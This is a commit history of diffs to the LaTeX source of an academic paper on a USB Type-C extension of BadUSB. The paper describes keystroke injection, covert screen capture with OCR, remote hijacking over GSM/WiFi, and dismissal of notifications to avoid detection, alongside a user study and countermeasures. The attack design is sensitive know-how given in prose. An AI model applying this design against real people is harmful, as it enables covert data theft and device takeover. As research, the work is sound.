 It provides a graphical interface for users to describe the functionalities or
-roles of the USB device and reject any usage beyond the description.
+roles of the \ac{USB} device and reject any usage beyond the description.
 %\shuqing{Can't bypass USBCheckIn.}
@@
 In this work, we proposed our approach addressing the limitations mentioned
-above and implemented a multi-mode attack model of USB, named \tool.  \tool
-extends BadUSB to support the features of USB Type-C.  Since USB Type-C is
+above and implemented a multi-mode attack model of \ac{USB}, named \tool.  \tool
+extends BadUSB to support the features of \ac{USB} Type-C.  Since \ac{USB} Type-C is
 capable to transfer video stream data, \tool could obtain the information of
 victim's graphical interface during attacks.  Combining it with the emulation
-of traditional HIDs like keyboards and mice, attackers are capable of
+of traditional \acp{HID} like keyboards and mice, attackers are capable of
 performing precise attacks.  We did experiments to verify that \tool could also
@@
 with the graphical interface.  Moreover, we implemented multiple attacking
-modes of USB attacks based on our approach to verify its effectiveness,
-including HID Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
+modes of \ac{USB} attacks based on our approach to verify its effectiveness,
+including \ac{HID} Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to
@@
 user study, we obtained a large amount of sensitive data through \tool, since
-users are usually unconscious of the necessity to check the USB devices they
+users are usually unconscious of the necessity to check the \ac{USB} devices they
 plugged in for security purposes.  
@@
 hardware authorization, distrust-by-default, etc.  It is worth noting that we
-designed a method, called isolated UI rendering, to separate the user interface
+designed a method, called isolated \ac{UI} rendering, to separate the user interface
 into sensitive and insensitive layers.  Only content on the insensitive layer
@@
     \item To our best knowledge, this is the first work to utilize new features
-	of USB Type-C.  The combination of new support with conventional BadUSB
+	of \ac{USB} Type-C.  The combination of new support with conventional BadUSB
 	makes attacks more precise and effective.
@@
 The rest of this paper is structured as follows.  Section~\ref{sec:background}
-provides the background of USB specification.  Section~\ref{sec:related_work}
-introduces the existing work of USB security from the aspects of attacking and
+provides the background of \ac{USB} specification.  Section~\ref{sec:related_work}
+introduces the existing work of \ac{USB} security from the aspects of attacking and
 defense respectively.  In Section~\ref{sec:badusb}, we present the threat model

### 2021-03-07 WOOT/Files/related_work.tex
fuck me with acronyms please

@@
 
-We survey related works on USB attacks in Section~\ref{subsec:usb_attack} and
-USB security defense in Section~\ref{subsec:usb_defence}, respectively.
+We survey related works on \ac{USB} attacks in Section~\ref{subsec:usb_attack} and
+\ac{USB} security defense in Section~\ref{subsec:usb_defence}, respectively.
 
@@
 
-During the development of the USB protocol, many USB-based attacks were proposed,
-ranging from DoS (Denial of Service) to protocol masquerading.
+During the development of the \ac{USB} protocol, many \mbox{\ac{USB}-based} attacks were proposed,
+ranging from \ac{DoS} to protocol masquerading.
 
 %Attacks against USB kernel drivers 
-From the kernel perspective, its USB software stack generally expects devices
-to follow the USB standard and may not consider corner cases of malformed USB
+From the kernel perspective, its \ac{USB} software stack generally expects devices
+to follow the \ac{USB} standard and may not consider corner cases of malformed \ac{USB}
 packets. Based on this, Facedancer~\cite{facedancer} and
 Syzkaller~\cite{syzkaller} use fuzzing techniques to uncover the bugs lying in
-the kernel drivers. These bugs can cause kernel crashes and lead to a DoS attack.
+the kernel drivers. These bugs can cause kernel crashes and lead to a \ac{DoS} attack.
 Though this poses a great challenge to the availability of a system, this
 attack still requires physical access to the host and is unable to cause more
-damage other than DoS.
+damage other than \ac{DoS}.
 
 % USB protocol attacks
-In the field of USB security, protocol masquerading is also a widely used
-attack scheme. Due to the lack of authentication in the USB protocol, malicious
+In the field of \ac{USB} security, protocol masquerading is also a widely used
+attack scheme. Due to the lack of authentication in the \ac{USB} protocol, malicious
 devices can hide their real functionality with re-written
@@
 execute malicious payloads as they were using the victim's devices. Due to the
-limitation of USB 2.0~\cite{usb20} protocol, these BadUSB
+limitation of \ac{USB} 2.0~\cite{usb20} protocol, these BadUSB
 attacks~\cite{badusb} are unable to obtain video feedback from the victim
-as video stream was not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
-support video transmission, there exists a protocol called MHL (Mobile
-High-Definition Link) which extends the USB standard and allows the video signal to
-be transmitted through the USB interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is such a work that abuses this standard and exfiltrate video data
+as video stream was not supported until \ac{USB} 3.0~\cite{usb30}. Though \ac{USB} 2.0 does not
+support video transmission, there exists a protocol called \ac{MHL} which extends the \ac{USB} standard and allows the video signal to
+be transmitted through the \ac{USB} interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is such a work that abuses this standard and exfiltrate video data
 from the victim without permission. However, in JFC, this data exfiltration is not
-combined with BadUSB attacks, and MHL is an outdated standard, which limits its
+combined with BadUSB attacks, and \ac{MHL} is an outdated standard, which limits its
 capability.
@@
 Besides attacking from the protocol perspective, previous works use a
-USB device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
-rootkit to hide malicious files on the USB storage device, \cite{flame} uses a
+\ac{USB} device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
+rootkit to hide malicious files on the \ac{USB} storage device, \cite{flame} uses a
 zero-day exploit and malicious \textit{autorun.inf} to execute the malware
@@
 attacks are much more damaging and flexible,
-but they require certain existing flaws like a \cite{zero-day} vulnerability and USB is merely
+but they require certain existing flaws like a \cite{zero-day} vulnerability and \ac{USB} is merely
 a payload delivery method.
@@
 % Using USB for information leakage
-As a data transmission protocol, USB inevitably leaks electromagnetic signals
+As a data transmission protocol, \ac{USB} inevitably leaks electromagnetic signals
 to the environment which may contain sensitive information. Leveraging this
@@
 \cite{usbee,turnip} emit electromagnetic emissions by data injection on the bus
-with the connected USB devices as an RF transmitter and \cite{usbkiller,cable}
+with the connected \ac{USB} devices as an RF transmitter and \cite{usbkiller,cable}
 inject analog
@@
 
-Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI
-connectors have been provided by USB Type-C, transferring of video data can be
+Since \ac{USB} 3.1 was introduced with \ac{USB} Type-C in 2013, display port and HDMI
+connectors have been provided by \ac{USB} Type-C, transferring of video data can be
 combined with the other attacks, like protocol masquerading,  protocol
@@
 are defined by the protocol to transmit data. Without these pins, data cannot 
-be transferred via a USB cable. Based
-on this fact, USB Condom~\cite{Condom} is a hardware solution to block data
+be transferred via a \ac{USB} cable. Based
+on this fact, \ac{USB} Condom~\cite{Condom} is a hardware solution to block data
 channels by adding a blocker in the connector. This blocker can cut off the `D-'
 and `D+' connection while leaving power pins intact. However, this method poses
-a great challenge to the plug-and-play property of USB, as once it is deployed, it
-stops all USB functions other than charging.
+a great challenge to the \ac{PnP} property of \ac{USB}, as once it is deployed, it
+stops all \ac{USB} functions other than charging.
 
-Under the premise of ensuring the full functionality of USB devices, some works
+Under the premise of ensuring the full functionality of \ac{USB} devices, some works
 improve the security during the connection establishment. Windows Defender
-ATP~\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices
+ATP~\cite{windenfenderwhite} maintains a whitelist of \ac{USB} devices, only devices
 on the whitelist are allowed to communicate with the host. This prevents all
@@
 certain security awareness and technical background to maintain a valid
-whitelist. For example, a naive user may add the USB device from unknown
+whitelist. For example, a naive user may add the \ac{USB} device from unknown
 sources to his/her whitelist without precaution. Fortunately, some designs have proposed to overcome
@@
 each device based on its functionality. Then these fingerprints are used to
-maintain a secure and valid whitelist of USB devices. There is another work
-mediating USB connectivity for industrial control. TMSUI~\cite{yang2015tmsui}
+maintain a secure and valid whitelist of \ac{USB} devices. There is another work
+mediating \ac{USB} connectivity for industrial control. TMSUI~\cite{yang2015tmsui}
 relies on the rich experience of administrators to build a whitelist. However, some
-modified USB devices may hide their real functionality from the user.
+modified \ac{USB} devices may hide their real functionality from the user.
 
@@
 USBeSafe\cite{usbesafe} analyses the 
-feature vector constructed from with data collected from USB Request Block(URBs), 
-it would detect the novel USB packets based on the machine learning algorithm and send 
+feature vector constructed from with data collected from \acp{URB}, 
+it would detect the novel \ac{USB} packets based on the machine learning algorithm and send 
 a alert to the user before enumeration. As BadUSB attacks normally request privileged 
@@
 
-After the USB enumeration and driver loading, some related works
+After the \ac{USB} enumeration and driver loading, some related works
 archive `defense in depth'
@@
 carried on portable media. Moreover, in GoodUSB, a VM is deployed in the host as
-a honeypot to detect and stop malicious behavior of USB devices.
+a honeypot to detect and stop malicious behavior of \ac{USB} devices.
 
@@
 of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exists an attack called JFC~\cite{JFC} which abuses the MHL
+exists an attack called JFC~\cite{JFC} which abuses the \ac{MHL}
 standard to steal video stream from the victim. In order to mitigate this
@@
 Therefore, there exists a clear trade-off between the effectiveness and the
-plug-and-play property. Though hardware disabling solutions like USB Condom
-archives almost absolute security, the functionality of USB is sacrificed.
+\ac{PnP} property. Though hardware disabling solutions like \ac{USB} Condom
+archives almost absolute security, the functionality of \ac{USB} is sacrificed.
 Other solutions like whitelist are either bypassable or insufficient
@@
 
-We summarize the former efforts on USB attacks and defenses in
+We summarize the former efforts on \ac{USB} attacks and defenses in
 Table~\ref{table:attack_vs_defense}.
@@
 		\hline
-		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull\\
+		\makecell{\ac{USB} condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull\\
 		\hline
@@
 	\end{tablenotes}
-	\caption{Effectiveness of Defenses against USB Attacks}
+	\caption{Effectiveness of Defenses against \ac{USB} Attacks}
 	\label{table:attack_vs_defense}

### 2021-03-07 WOOT/Files/countermeasure.tex
revise contermeasure

@@
 \textbf{External Hardware Authorization.} One possible countermeasure is to
-introduce external hardware completing the authorization process. Contrary to
-the GoodUSB, USBCheckIn~\cite{usbcheckin} adopts a dedicated hardware between
+introduce external hardware completing the authorization process. For example,
+ USBCheckIn~\cite{usbcheckin} adopts a dedicated hardware between
 the host and device. When a device is plugged-in, the authorization will be
@@
 To defend against \tool and other USB-based attacks, we can simply reject all
-{unauthorized} device -- applying the \textit{distrust-by-default} policy.  It
-is worth mentioning that \textit{distrust-by-default} policy is not the same as
-GoodUSB~\cite{tian2015defending}.  
-%\fengwei{the following sentence needs to be
-%written. I am confused.}\hongyi{Fixed, use more concise sentences} 
-GoodUSB permits limited functionality of untrusted devices while this strict policy forbids all functions of an untrusted device. Though \textit{distrust-by-default} policy effectively
-prevents these attacks, it also causes considerable inconvenience for users.
+{unauthorized} device -- applying the \textit{distrust-by-default} policy. For example, 
+in GoodUSB~\cite{tian2015defending}, all \ac{USB} devices are enabled with corresponding 
+functionality only after being authorized by the user. This defense effectively stops attack 
+like \tool.
 

### 2021-03-07 WOOT/Files/background.tex
Update

@@
 %\noindent\outline{Security Problem}\\
-During the development of \ac{USB} specification, security was rarely considered. As
+During the development of \ac{USB} specification, security was considered insufficiently~\cite{sok}. As
 the \ac{USB}-IF believes it is the duty of \acp{OEM}
@@
 	\hline
-	1996 & \ac{USB} 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & \ac{HID} Emulating (BadUSB)~\cite{badusb} \\
+	1996 & \ac{USB} 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & \ac{HID} Emulation (BadUSB)~\cite{badusb} \\
 	\hline

### 2021-03-07 WOOT/Files/introduction.tex
Update

@@
 The designers of the \ac{USB} protocol did not care much about security issues as
-they wanted to make an easy-to-use protocol.  There are more than four hundred
+they wanted to make an easy-to-use protocol.  There are more than 400
 vulnerabilities referencing \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
@@
 capabilities of BadUSB attacks.  When performing attacks on another host, the
-attackers can not obtain the current \ac{UI} status which limits
+attackers cannot obtain the current \ac{UI} status which limits
 them from taking subsequent moves.  For example, it is hard for attackers to

### 2021-03-07 WOOT/Files/related_work.tex
Update

@@
 attacks are much more damaging and flexible,
-but they require certain existing flaws like a \cite{zero-day} vulnerability and \ac{USB} is merely
+but they require certain existing flaws like a zero-day vulnerability\cite{zero-day}  and \ac{USB} is merely
 a payload delivery method.
@@
 It is worth noting that our \tool is different from JFC~\cite{JFC}.
-Juice Filming Attacks can not control the attacked device, it can only video-capture user inputs during charging.
+Juice Filming Attacks cannot control the attacked device, it can only video-capture user inputs during charging.
 However, our \tool can control the attacked device at the same time as monitoring the screen, which enhances the efficiency of stealing users' private data.
@@
 
-From the hardware perspective, the BadUSB attack requires `D-' and `D+' pins which
+From the hardware perspective, the BadUSB attack requires \mbox{`D-' and `D+'} pins which
 are defined by the protocol to transmit data. Without these pins, data cannot 
@@
 on this fact, \ac{USB} Condom~\cite{Condom} is a hardware solution to block data
-channels by adding a blocker in the connector. This blocker can cut off the `D-'
-and `D+' connection while leaving power pins intact. However, this method poses
+channels by adding a blocker in the connector. This blocker can cut off the \mbox{`D-' and `D+'} connection while leaving power pins intact. However, this method poses
 a great challenge to the \ac{PnP} property of \ac{USB}, as once it is deployed, it

### 2021-03-07 WOOT/Files/countermeasure.tex
Countermeasures
Update

@@
 introduce external hardware completing the authorization process. For example,
- USBCheckIn~\cite{usbcheckin} adopts a dedicated hardware between
+ \mbox{USBCheckIn}~\cite{usbcheckin} adopts a dedicated hardware between
 the host and device. When a device is plugged-in, the authorization will be
 conducted on the dedicated hardware instead of the internal display, preventing
-the host from being hijacked. Though USBCheckIn is an adequate defense against
+the host from being hijacked. Though \mbox{USBCheckIn} is an adequate defense against
 \tool, the external hardware brings additional cost and inconvenience,
@@
 in GoodUSB~\cite{tian2015defending}, all \ac{USB} devices are enabled with corresponding 
-functionality only after being authorized by the user. This defense effectively stops attack 
+functionality only after being authorized by the user. 
+Defense like USB Condom distrusts all types of \ac{USB} devices by blocking data channels and stopping all \ac{USB} functions other than charging.
+Such defense methods effectively stop attacks 
 like \tool.

### 2021-03-07 WOOT/Files/related_work.tex
Update

@@
 To solve this flaw, GoodUSB~\cite{tian2015defending} reports the functionality claimed
-by the device to the user and let the user decides whether to authorize. When a device
+by the device to the user and let the user decide whether to authorize. When a device
 is plugged in, GoodUSB limits its functionality before enumeration until a
@@
 short time to reduce the risk of being discovered. This defect causes the
-typing characteristics of BadUSB to be detectable. Pham \emph{et al.}~\cite{pham2010optimizing} optimize windows security features, which can
+typing characteristics of BadUSB to be detectable. Pham \emph{et al.}~\cite{pham2010optimizing} optimize Windows security features, which can
 block the execution of unsigned files and the installation of unsigned drivers

### 2021-03-08 WOOT/Files/experiment.tex
Update
user study

@@
 
-Next, we summarize the possible threats toward user under different modes.
+Next, we summarize the possible threats toward users under different modes.
 \hongyi{Better way to express this?}
@@
 To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
-After every case study experiment, we introduced to him/her our attack, showed him/her the only raw files (video recorded and corresponding \ac{OCR} results), told him/her to analyze the screen recordings and replace certain characters of the private data that appear in the \ac{OCR} result with asterisks.
+After each experiment, the raw video and the corresponding \ac{OCR} result file will be generated automatically, then we showed these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
 It protects their privacy and is also a mark for us to confirm that the data we find contains their private data.
-After he/she made sure their private data is not at risk, he/she can destroy the only raw files, give the desensitized \ac{OCR} result back to us.
+At last, he/she would destroy all original files, leave only the desensitized \ac{OCR} result for us.
 \shuqing{Do we need to mention that agreement the conference required here?}
@@
 During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
-In total, there are $94,058$ entries of data collected among 10 volunteers.
+In total, there are 94,058 entries of data collected among 10 volunteers.
 %\shuqing{The data may need to be updated.}

### 2021-03-08 WOOT/Files/experiment.tex
user study

@@
 To obtain data close to real-life, they are requested to use phones like when they use the normal shared power banks.
-After each experiment, the raw video and the corresponding \ac{OCR} result file will be generated automatically, then we showed these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
+After each experiment, the raw video and the corresponding \ac{OCR} result file will be generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
 It protects their privacy and is also a mark for us to confirm that the data we find contains their private data.

### 2021-03-09 WOOT/Files/related_work.tex
zero-day

@@
 \ac{USB} device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
-rootkit to hide malicious files on the \ac{USB} storage device, \cite{flame} uses a
+rootkit to hide malicious files on the \ac{USB} storage device, Flame\cite{flame} uses a
 zero-day exploit and malicious \textit{autorun.inf} to execute the malware
-automatically. There are also works like \cite{brain,stuxnet,conficker}
+automatically. There are also works \cite{brain,stuxnet,conficker}
 following the same paradigm and performing code-injection attacks. These
@@
 USBeSafe\cite{usbesafe} analyses the 
-feature vector constructed from with data collected from \acp{URB}, 
+feature vector constructed with the data collected from \acp{URB}, 
 it would detect the novel \ac{USB} packets based on the machine learning algorithm and send 

### 2021-03-10 WOOT/Files/experiment.tex
fix table

@@
 	\item \textbf{Dismiss Notification}:
-		In our experiment, we found that some devices will notify the user presence of an external screen.
-To avoid being discovered by the victim, \tool will inject keystrokes and mouse movement to dismiss these notifications.
-Detailed notifications is listed in Table~\ref{tab:notification}.
+		In our experiment, we found that some devices will notify the user presence of an external screen. During our experiment, the following notifications are raised: 
+		\begin{itemize}
+		 \item On Lenovo Xiaoxin Pro 13, it raised a pop-up asking user to select the functionality of the external screen. 
+		 \item On Huawei P30, it showed a status bar indicator and a persistent notification about the external monitor.
+		 \item On iPad Pro (\nth{3} generation), it also showed a blue status bar indicator and a notification about \ac{USB} accessories if iPad is locked.
 		\end{itemize}
-
+		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movement to dismiss some of these notifications.
+For example, in the first case, \tool is able to inject a sequence of mouse movement to set the screen at mirror mode to dismiss the pop-up.
+\end{itemize}
+\begin{comment}
 \begin{table*}[]
@@
 \end{table*}
+\end{comment}
 

### 2021-03-10 WOOT/BadUSBC.tex
gramarly abstract and intro

@@
 
-The security of \ac{USB} protocol has been paid extensive attention to because of its
+The security of the \ac{USB} protocol has been paid extensive attention to because of its
     wide usage.  Due to the \textit{trust-by-default} characteristics, \ac{USB}
-    security has caused serious problems.  For example, a well-known firmware
+    security has caused severe problems.  For example, a well-known firmware
     attack, BadUSB, performs malicious operations on the victim hosts through
-    disguising normal \ac{USB} devices as human interface devices like keyboards and
+    disguising ordinary \ac{USB} devices as human interface devices like keyboards and
     mice.  However, BadUSB suffers from several limitations.  Attackers cannot
-    obtain the status of user interface to conduct precise attacks as well as get the visual feedback of their attacks.  In this work, we
-    extended BadUSB to support the new features of \ac{USB} Type-C and proposed a
+    obtain the status of \ac{UI} to conduct precise attacks and get the visual feedback of their attacks.  In this work, we
+    extended BadUSB to support the new \ac{USB} Type-C features and proposed a
     multi-mode attack model, \tool.  It obtains UI status to make attacks more 

### 2021-03-10 WOOT/Files/introduction.tex
gramarly abstract and intro

@@
 
-The \ac{USB} protocol has become popular around the world
+The \ac{USB} protocol has become popular worldwide
 since its appearance, as it provides a unified and easy-to-use approach for a
-large range of devices to communicate with each other.  From version 1.0 till
+extensive range of devices to communicate with each other.  From version 1.0 till
 now, \ac{USB} specification has evolved rapidly and offered more and more
@@
 
-On the other side of the coin, the security of \ac{USB} has caused serious problems.
-The designers of the \ac{USB} protocol did not care much about security issues as
-they wanted to make an easy-to-use protocol.  There are more than 400
+On the other side of the coin, the security of \ac{USB} has caused severe problems.
+Recent research of all USB specifications indicates that security has not been taken into consideration.~\cite{sok}  There are more than 400
 vulnerabilities referencing \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
@@
 BadUSB is a well-known class of firmware attacks~\cite{badusb}.  These attacks
-are conducted through modification of the device firmware, which will disguise
-normal \ac{USB} devices as other types of devices that are \textit{trust-by-default}
+are conducted by modifying the device firmware, which will disguise
+ as ordinary \ac{USB} devices as other types of devices that are \textit{trust-by-default}
 by the hosts.  Typical simulated devices include \ac{HID}~\cite{hid} and disks.  Utilizing BadUSB,
-attackers can pretend themselves as normal users, typing malicious commands to
+attackers can pretend themselves as regular users, typing malicious commands to
 victim computers, downloading and executing malicious scripts, and copying out
 private data from disks.  Such attacks can easily escape from traditional
-anti-virus software since it is hard to distinguish them from normal \ac{USB}
+anti-virus software since it is hard to distinguish them from ordinary \ac{USB}
 devices.
@@
 capabilities of BadUSB attacks.  When performing attacks on another host, the
-attackers cannot obtain the current \ac{UI} status which limits
+attackers cannot obtain the current \ac{UI} status, limiting
 them from taking subsequent moves.  For example, it is hard for attackers to
@@
 malicious scripts for execution.  However, these attacks may be intercepted by
-anti-virus software or firewall due to the usage of the host network.  (2) To
+anti-virus software or firewall due to the host network usage.  (2) To
 our best knowledge, existing BadUSB attacks only utilize the features of \ac{USB}
 2.0.  The release of \ac{USB} 3.0 makes \ac{USB} more powerful, with a higher
-transmission rate for data and the support towards a larger range of
-peripherals including DisplayPort, HDMI, PowerDelivery, etc.  BadUSB attacks
+transmission rate for data and the support towards a more extensive range of
+peripherals such as DisplayPort, HDMI and PowerDelivery.  BadUSB attacks
 can become more effective with the help of newly supported features in \ac{USB} 3.0.
@@
 above and implemented a multi-mode attack model of \ac{USB}, named \tool.  \tool
-extends BadUSB to support the features of \ac{USB} Type-C.  Since \ac{USB} Type-C is
-capable to transfer video stream data, \tool could obtain the information of
+extends BadUSB to support the features of \ac{USB} Type-C.  Since \ac{USB} Type-C can transfer video stream data, \tool could obtain the information of the
 victim's graphical interface during attacks.  Combining it with the emulation
@@
 plugged in for security purposes.  
-10 volunteers are involved in the user study.
-At last, we found that 4,796 of 94,058 records obtained by \tool are related to privacy information of users.
+Ten volunteers are involved in the user study.
+Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information.
 After the validation of our attack model, we
@@
 designed a method, called isolated \ac{UI} rendering, to separate the user interface
-into sensitive and insensitive layers.  Only content on the insensitive layer
-will be passed to the insecure driver and thus rendered on the external
-display, which protects content on the sensitive layer.
+into sensitive and insensitive layers.  Only the insensitive layer's content will be passed to the insecure driver and thus rendered on the external display, protecting the sensitive layer's content.
 %\shuqing{Case study, evaluation, notable results.}
@@
 introduces the existing work of \ac{USB} security from the aspects of attacking and
-defense respectively.  In Section~\ref{sec:badusb}, we present the threat model
+defense, respectively.  In Section~\ref{sec:badusb}, we present the threat model
 and the overall implementation of \tool in three different modes.  The

### 2021-03-10 WOOT/Files/experiment.tex
Update case study

@@
 \label{subsec:case_study}
+\tool can be used in various attack scenarios, ranging from mobile devices to PC devices.
+For example, \tool can be attached to the power station, which provides USB 3 hubs, in the airport to perform attacks.
+Most people charge their laptops or smartphones in the power station in emergency, with negligence of security.
+In the following paragraphs,
 

### 2021-03-10 WOOT/Files/experiment.tex
Update case study

@@
 \tool can be used in various attack scenarios, ranging from mobile devices to PC devices.
-For example, \tool can be attached to the power station, which provides USB 3 hubs, in the airport to perform attacks.
+For example, \tool can be attached to the power station, which provides USB 3.x hubs, in the airport to perform attacks.
 Most people charge their laptops or smartphones in the power station in emergency, with negligence of security.
-In the following paragraphs,
+In the following paragraphs, we will demonstrate the attack scenarios of \tool using sharing power bank as an example.
 

### 2021-03-10 WOOT/Files/background.tex
Update

@@
 %\noindent\outline{HID Protocol}\\
-Right after one year of the appearance of \ac{USB} 1.0, a standard named \acf{HID}~\cite{hid} was born based on \ac{USB}. \ac{HID} is
+Right after one year of the appearance of \ac{USB} 1.0, a standard named \acf{HID}~\cite{hid} was designed based on \ac{USB}. \ac{HID} is
 designed with to unify the implementation for devices like mice,
@@
 
-In 1998, the first widely supported \ac{USB} protocol was born. \ac{USB} 1.1~\cite{usb11}
+In 1998, the first widely supported \ac{USB} protocol was designed. \ac{USB} 1.1~\cite{usb11}
 provided two data transfer rates which are low speed (1.5 Mbit/s) and full
@@
 popularity of ``flash drive'', a portable device that allows physically
-transferring data around~\cite{sok}. Though various peripherals were supported
+transferring data around~\cite{sok}. Although various peripherals were supported
 in \ac{USB} 2.0, there was no reliable way to identify the type of device. This

### 2021-03-10 WOOT/Files/related_work.tex
Update

@@
 These works rewrite the firmware of a normal-looking flash drive, which allows
-it to pretend like other devices. When these modified drives are connected to the
+it to act like other devices. When these modified drives are connected to the
 host, they could be recognized as a keyboard or mouse. Then the attacker can
@@
 attacks~\cite{badusb} are unable to obtain video feedback from the victim
-as video stream was not supported until \ac{USB} 3.0~\cite{usb30}. Though \ac{USB} 2.0 does not
+as video stream was not supported until \ac{USB} 3.0~\cite{usb30}. Although \ac{USB} 2.0 does not
 support video transmission, there exists a protocol called \ac{MHL} which extends the \ac{USB} standard and allows the video signal to
-be transmitted through the \ac{USB} interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is such a work that abuses this standard and exfiltrate video data
+be transmitted through the \ac{USB} interface. JFC~\cite{JFC}, short for Juicy Filming Attacks is an example that abuses this standard and exfiltrate video data
 from the victim without permission. However, in JFC, this data exfiltration is not
@@
 % Using USB devices to inject code
-Besides attacking from the protocol perspective, previous works use a
+Besides attacking from the protocol perspective, previous works\shuqing{re?} used a
 \ac{USB} device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode

### 2021-03-10 WOOT/Files/badusb.tex
Update

@@
 We build our threat model on the basic assumptions that common users without
-technical background would not treat normal-looking \ac{USB} device as malicious and be cautious about them.
-This assumption is consistent with existing works~\cite{JFCImpact}.
-Moreover, we neglect the
+technical background would not treat normal-looking \ac{USB} device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we omit the
 effect of notifications from \ac{USB} devices, as users may not have the knowledge to fully understand such notifications. In
@@
 proposed. For example, GoodUSB~\cite{tian2015defending}
-implemented a authorization procedure when a new device is plugged in and blocks other functions excepted authorized ones.
+implemented an authorization procedure when a new device is plugged in and blocks other functions except authorized ones.
 
@@
 
-\textbf{\ac{HID} Emulation Mode.} This mode majorly relies on the ``\ac{HID} Emulator'' in the Figure~\ref{fig:attack_model} to
+\textbf{\ac{HID} Emulation Mode.} This mode mainly relies on the ``\ac{HID} Emulator'' in the Figure\shuqing{fig 3 delete?}~\ref{fig:attack_model} to
 send constructed \ac{HID} packet to the victim. These constructed \ac{HID} packets are
@@
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
-Existence of such feedback channel largely strengthen the attack ability of \tool.
+Existence of such a feedback channel largely strengthens the attack ability of \tool.
 
@@
 Yet with the video output support from \ac{USB} 3.x, our \tool implements a
-full-functional mouse emulation. This function enables attacks toward pure \ac{GUI}
+fully-functional mouse emulation. This function enables attacks toward pure \ac{GUI}
 programs and shows attacks in the mobile attack scenarios. Details can
@@
 
-The advantage of this mode is that it archives defense bypass and attack
+The advantage of this mode is that it achieves defense bypass and attack
 feedback with video streaming.  
@@
 \textbf{Video Capture Mode.} \tool under this mode does not emulate other
-USB device and solely relies on the video stream function of \ac{USB} 3.x; it uses
+USB device and solely relies on the video stream function of \ac{USB} 3.x; it uses the 
 ``Video Capture'' component as shown in the Figure~\ref{fig:attack_model} to transmit the stream to the embedded ``Single Board Computer''.
@@
 %text?}. 
-The victim's device would mistakenly treat \tool as an external monitor
+The victim's device mistakenly treats \tool as an external monitor
 and output its video stream. This stream is latter processed by the embedded
@@
 When running in this mode, \tool passively processes the victim's video stream
-and detect for ``valuable'' private data.  The data is considered as
-``valuable'' or not is decided by a customized detector, we implemented a simple
+and detects ``valuable'' private data.  The data is considered as
+``valuable'' or not by a customized detector. We implemented a simple
 payment code detector for the poof-of-concept purpose, which demonstrates that we successfully transfer money from a victim to an
@@
 It is worth mentioning that \tool under this mode is completely passive, making
-it hard to be detected. With different detector implemented, \tool
+it hard to be detected. With different detectors implemented, \tool
 under this mode is capable of serving more purposes.
@@
 required to control a computer/mobile device completely, including a video stream
-and a keyboard/mouse emulation. Thus with all components enabled, not only
+and a keyboard/mouse emulation. Thus with all components enabled, not only does
 the victim's device treat \tool as an external display, but also a valid \ac{HID}
-input source. Hence we can archive complete hijack of victim's device.
+input source. Hence we can achieve complete hijack of victim's device.
 
 \tool under this mode follows a simple logic. \tool receives video stream
-from the victim's device and redirect it to the attacker via GSM/WiFi. In the
-meanwhile, \tool also receives keystrokes and mouse movement from the attacker
+from the victim's device and redirects it to the attacker via GSM/WiFi. In the
+meanwhile, \tool also receives keystrokes and mouse movements from the attacker
 through GSM/WiFi and replays them to the victim by the \ac{USB} emulation.
 
-This mode enable attacker to perform delicate operations that are beyond
-automation. Moreover, this mode provides a backdoor that does not require host
+This mode enables attacker to perform delicate operations that are beyond
+automation. Moreover, this mode provides a backdoor that does not require a host
 network and thus is undetectable by the firewall running on the host machine.
@@
 
-The advantage of this mode is that it can completely hijack the victim device
-and provide a backdoor beyond detection of firewalls; however, this complete control
+The advantage of this mode is that it can completely hijack the victims device
+and provides a backdoor beyond detection of firewalls; however, this complete control
 also comes with the price of high power consumption and risk of being detected

### 2021-03-10 WOOT/Files/background.tex

@@
 %\noindent\outline{USB3.x}\\
-\ac{USB} 3.0~\cite{usb30} was announced in 2008, with a super speed (5 Gbit/s) data
+\ac{USB} 3.0~\cite{usb30} was introduced in 2008, with a super speed (5 Gbit/s) data
 transfer rate. Like its predecessor, more classes of peripherals were supported
@@
 itself as a monitor can capture the video stream from the host. Exposing
-such a multi-propose connector unprotected is insecure and allows attacks like
-this work \tool. In 2017, \ac{USB} 3.2~\cite{usb32} was released, doubling the data
+such a multi-purpose connector unprotected is insecure and allows attacks similar to \tool. In 2017, \ac{USB} 3.2~\cite{usb32} was released, doubling the data
 transfer rate (20 Gbit/s).
@@
 connector only has two pins for data transferring \mbox{(D+ \& D-)}, which has
-significantly limited data transfer rate \mbox{(5 Gbits/s Max)} and cannot support for
+significantly limited data transfer rate \mbox{(5 Gbits/s Max)} and cannot support
 peripherals like DisplayPort \mbox{(10.8 Gbit/s Min)}. Apart from that, support for
-other peripherals also require dedicated transferring lane as their standards
